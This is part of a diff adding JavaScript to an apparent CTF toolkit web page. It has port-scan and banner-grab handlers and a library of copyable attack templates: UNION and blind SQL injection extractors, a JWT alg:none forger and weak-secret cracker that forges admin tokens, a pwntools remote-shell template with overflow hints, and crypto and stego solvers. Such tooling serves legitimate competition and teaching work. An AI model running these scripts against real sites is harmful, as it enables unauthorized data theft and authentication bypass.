+  const d=await post('/net/portscan',{host:gv('psHost'),ports:gv('psPorts')});
+  if(!d.open_ports?.length){el.innerHTML='<span style="color:var(--t3)">No open ports found</span>';return;}
+  let h='<table class="kv">';
+  d.open_ports.forEach(p=>h+=`<tr><td><span class="tag tag-g">${p.port}/tcp</span></td><td>${esc(p.banner||'open')}</td></tr>`);
+  h+='</table>';
+  el.innerHTML=h;
+}
+async function doBanner() {
+  const d=await post('/net/banner',{host:gv('bgHost'),port:gv('bgPort')});
+  let h=`<pre class="code">${esc(d.banner||d.error||'')}</pre>`;
+  if(d.flags?.length) h+=`<div class="flag-hit">🚩 ${d.flags.join(', ')}</div>`;
+  document.getElementById('bannerRes').innerHTML=h;
+}
+
+// ── MISC ──────────────────────────────────────────────────────────
+async function doMisc() {
+  const d=await post('/misc/identify',{text:gv('miscIn')});
+  let h=`<table class="kv"><tr><td>length</td><td>${d.length}</td></tr><tr><td>unique chars</td><td>${d.char_count}</td></tr></table>`;
+  h+='<div style="margin-top:7px"><div class="sec-t">Likely encodings</div>';
+  d.likely_encodings.forEach(e2=>h+=`<span class="tag tag-c">${e2}</span>`);
+  h+='</div>';
+  document.getElementById('miscRes').innerHTML=h;
+}
+async function doZWC() {
+  const d=await post('/misc/zerowidth',{text:gv('zwcIn')});
+  let h=`<table class="kv"><tr><td>ZWC found</td><td>${d.total_zwc}</td></tr></table>`;
+  if(d.decoded) h+=`<div class="flag-hit">Decoded: ${esc(d.decoded)}</div>`;
+  if(d.binary_extract) h+=`<pre class="code">Binary: ${d.binary_extract.slice(0,200)}</pre>`;
+  if(d.zero_width_chars?.length){
+    h+='<div class="sec-t" style="margin-top:6px">Positions</div><pre class="code">';
+    d.zero_width_chars.slice(0,30).forEach(([i,c,v])=>h+=`pos ${i}: ${c} → ${v}\n`);
+    h+='</pre>';
+  }
+  document.getElementById('zwcRes').innerHTML=h;
+}
+
+// ── SCRIPTS ──────────────────────────────────────────────────────
+const SCRIPTS = [
+  {title:'Web — auto SQLi union extractor', code:`import requests, re, sys
+url = 'http://TARGET/vuln.php'
+param = 'id'
+session = requests.Session()
+session.headers['Cookie'] = 'session=YOUR_COOKIE'
+
+# Step 1: find column count
+for n in range(1, 15):
+    payload = f"' UNION SELECT {','.join(['NULL']*n)}--"
+    r = session.get(url, params={param: payload}, verify=False)
+    if r.status_code == 200 and 'error' not in r.text.lower():
+        cols = n; print(f'[+] Columns: {n}'); break
+
+# Step 2: find printable column
+for i in range(1, cols+1):
+    vals = ['NULL']*cols; vals[i-1] = "'PRINTABLE'"
+    r = session.get(url, params={param: f"' UNION SELECT {','.join(vals)}--"}, verify=False)
+    if 'PRINTABLE' in r.text:
+        printcol = i; print(f'[+] Printable column: {i}'); break
+
+def sqli(q):
+    vals = ['NULL']*cols; vals[printcol-1] = q
+    r = session.get(url, params={param: f"' UNION SELECT {','.join(vals)}--"}, verify=False)
+    m = re.search(r'SQLI_RESULT(.*?)SQLI_END', r.text, re.DOTALL)
+    return m.group(1) if m else r.text[:300]
+
+# Adjust query to wrap result: "concat('SQLI_RESULT',db,'SQLI_END')"
+print('Database:', sqli("concat('SQLI_RESULT',database(),'SQLI_END')"))
+print('Tables:', sqli("concat('SQLI_RESULT',(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),'SQLI_END')"))`},
+  {title:'Web — blind SQLi boolean (binary search)', code:`import requests
+
+url = 'http://TARGET/vuln.php'
+param = 'id'
+
+def query_bool(sql):
+    payload = f"' AND ({sql})--"
+    r = requests.get(url, params={param: payload}, verify=False)
+    return 'expected_true_indicator' in r.text  # adjust!
+
+def extract_string(sql, max_len=50):
+    result = ''
+    for pos in range(1, max_len+1):
+        lo, hi = 32, 126
+        while lo < hi:
+            mid = (lo+hi)//2
+            if query_bool(f"ascii(substr(({sql}),{pos},1))>{mid}"):
+                lo = mid+1
+            else:
+                hi = mid
+        c = chr(lo)
+        if c == chr(32): break
+        result += c
+        print(f'\\r[+] {result}', end='', flush=True)
+    print(); return result
+
+print('Database:', extract_string('SELECT database()'))
+print('Flag:', extract_string('SELECT flag FROM flags LIMIT 1'))`},
+  {title:'Crypto — RSA full solver', code:`from sympy import mod_inverse, factorint
+from Crypto.Util.number import long_to_bytes
+
+n = YOUR_N
+e = YOUR_E
+c = YOUR_C
+
+# Option 1: if you have p,q
+p = YOUR_P
+q = YOUR_Q
+phi = (p-1)*(q-1)
+d = mod_inverse(e, phi)
+m = pow(c, d, n)
+print('[+] Flag:', long_to_bytes(m).decode(errors='replace'))
+
+# Option 2: small e (e=3), no padding
+import gmpy2
+m, exact = gmpy2.iroot(c, e)
+if exact:
+    print('[+] Small e flag:', long_to_bytes(int(m)).decode(errors='replace'))
+
+# Option 3: common factor (two RSA keys share a prime)
+# n1, n2 = ...; from math import gcd; p = gcd(n1,n2)
+
+# Option 4: Wiener attack (small d)
+# pip install owiener
+import owiener
+d = owiener.attack(e, n)
+if d: print('[+] Wiener d:', d); print(long_to_bytes(pow(c,d,n)))`},
+  {title:'Crypto — XOR multi-byte key recovery', code:`import itertools
+
+ciphertext = bytes.fromhex('YOUR_HEX_HERE')
+
+def xor(data, key):
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+def ic(data):  # index of coincidence
+    freq = [data.count(i) for i in range(256)]
+    n = len(data)
+    return sum(f*(f-1) for f in freq) / (n*(n-1)) if n > 1 else 0
+
+# Find key length (Kasiski / IC method)
+best_keylen = 1; best_ic = 0
+for kl in range(1, 20):
+    avg_ic = sum(ic(ciphertext[i::kl]) for i in range(kl)) / kl
+    if avg_ic > best_ic: best_ic = avg_ic; best_keylen = kl
+print(f'[+] Likely key length: {best_keylen}')
+
+# Find each byte of key
+key = []
+for i in range(best_keylen):
+    chunk = ciphertext[i::best_keylen]
+    best = max(range(256), key=lambda k: sum((b^k)==32 or 65<=(b^k)<=90 or 97<=(b^k)<=122 for b in chunk))
+    key.append(best)
+key = bytes(key)
+print(f'[+] Key: {key}')
+print(f'[+] Plaintext: {xor(ciphertext, key).decode(errors="replace")}')`},
+  {title:'Forensics — LSB steganography extractor', code:`from PIL import Image
+import re
+
+def lsb_extract(path, bits_per_channel=1, channels=(0,1,2)):
+    img = Image.open(path).convert('RGB')
+    pixels = list(img.getdata())
+    bits = ''
+    for pixel in pixels:
+        for ch in channels:
+            for b in range(bits_per_channel):
+                bits += str((pixel[ch] >> b) & 1)
+    # Try to decode as text
+    chars = []
+    for i in range(0, len(bits)-7, 8):
+        byte = int(bits[i:i+8], 2)
+        if byte == 0: break
+        chars.append(chr(byte) if 32 <= byte <= 126 else '?')
+    result = ''.join(chars)
+    flags = re.findall(r'[a-zA-Z0-9_]+\\{[^}]+\\}', result)
+    print(f'[+] Extracted: {result[:300]}')
+    if flags: print(f'[+] 🚩 FLAGS: {flags}')
+    return result
+
+lsb_extract('challenge.png')
+# Try different channel combos if ^ fails
+for ch_combo in [(0,),(1,),(2,),(0,1,2)]:
+    lsb_extract('challenge.png', channels=ch_combo)`},
+  {title:'Web — JWT cracker (weak secret)', code:`import jwt, json, base64, hmac, hashlib, itertools
+
+token = 'YOUR_JWT_HERE'
+parts = token.split('.')
+
+def b64d(s):
+    return base64.urlsafe_b64decode(s + '==')
+
+header = json.loads(b64d(parts[0]))
+payload = json.loads(b64d(parts[1]))
+print('[*] Header:', header)
+print('[*] Payload:', payload)
+alg = header.get('alg', 'HS256')
+
+# Try alg:none
+fake_header = base64.urlsafe_b64encode(json.dumps({**header,'alg':'none'}).encode()).rstrip(b'=').decode()
+none_token = f"{fake_header}.{parts[1]}."
+print('[+] alg:none token:', none_token)
+
+# Crack weak secret
+wordlist = ['secret','password','123456','admin','key','jwt','ctf','flag',
+            'mysecret','supersecret','topsecret','verysecret']
+for word in wordlist:
+    try:
+        decoded = jwt.decode(token, word, algorithms=[alg])
+        print(f'[+] 🚩 Secret found: {word}')
+        # Forge admin token
+        payload['role'] = 'admin'; payload['admin'] = True; payload['user'] = 'admin'
+        forged = jwt.encode(payload, word, algorithm=alg)
+        print('[+] Forged admin token:', forged)
+        break
+    except: pass`},
+  {title:'Network — pwntools CTF shell', code:`from pwn import *
+import re
+
+# Connect
+host = 'TARGET'
+port = 1337
+
+# For local binary: p = process('./binary')
+# For remote:
+p = remote(host, port)
+
+# Useful functions
+def send(data): p.sendline(data.encode() if isinstance(data, str) else data)
+def recv(): return p.recvall(timeout=2).decode(errors='replace')
+def recvuntil(s): return p.recvuntil(s.encode()).decode(errors='replace')
+
+# Read banner
+banner = p.recv(1024).decode(errors='replace')
+print('[*] Banner:', banner)
+
+# Find flag pattern
+flags = re.findall(r'[a-zA-Z0-9_]+\\{[^}]+\\}', banner)
+if flags: print('[+] 🚩 FLAG in banner:', flags)
+
+# Buffer overflow template:
+# offset = cyclic_find(p.recv().split(b'Segfault')[0])
+# payload = b'A' * offset + p64(0xdeadbeef)  # overwrite RIP
+
+# Format string template:
+# for i in range(1,50): send(f'%{i}$s') → find leak
+
+p.interactive()`},
+];
+function loadScripts() {
+  const el=document.getElementById('scriptsArea');
+  let h='';
+  SCRIPTS.forEach((s,i)=>{
+    h+=`<div class="sec" style="margin-bottom:10px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:7px">
+        <span style="color:var(--cy);font-size:11px">${s.title}</span>
+        <div style="display:flex;gap:5px">
+          <button class="btn bg btn-sm" onclick="copyText(SCRIPTS[${i}].code)">copy</button>
+          <button class="btn ba btn-sm" onclick="inj('Use and adapt this script for my CTF challenge:\\n\\n'+SCRIPTS[${i}].code)">→ AI</button>
+        </div>
+      </div>
+      <pre class="code">${esc(s.code)}</pre>
+    </div>`;
+  });
+  el.innerHTML=h;
+}
+
+// ── helpers ───────────────────────────────────────────────────────
+const gv = id => (document.getElementById(id)||{}).value||'';
+const st = (id,t,c) => { const el=document.getElementById(id); if(el){el.textContent=t;el.style.color=c;} };
+const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+async function post(path, body) {
+  const r=await fetch(API+path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+  return r.json();
+}
+function copyEl(id) { navigator.clipboard.writeText(document.getElementById(id).textContent||''); }
+function copyText(t) { navigator.clipboard.writeText(t); }
+</script>
+</body>
+</html>
